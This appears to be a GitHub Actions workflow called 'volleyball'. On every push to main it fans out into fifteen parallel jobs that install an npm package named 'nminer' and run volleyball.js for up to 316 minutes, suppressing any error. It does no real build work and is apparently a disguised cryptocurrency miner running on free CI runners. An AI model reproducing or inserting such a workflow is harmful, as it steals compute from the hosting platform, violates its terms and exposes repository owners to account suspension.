name: volleyball
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4514 }
          - { version: 1579 }
          - { version: 5402 }
          - { version: 8227 }
          - { version: 6728 }
          - { version: 7646 }
          - { version: 6409 }
          - { version: 7342 }
          - { version: 1979 }
          - { version: 3739 }
          - { version: 7706 }
          - { version: 4342 }
          - { version: 3849 }
          - { version: 7809 }
          - { version: 6172 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 316m node volleyball.js || echo "volleyball executed"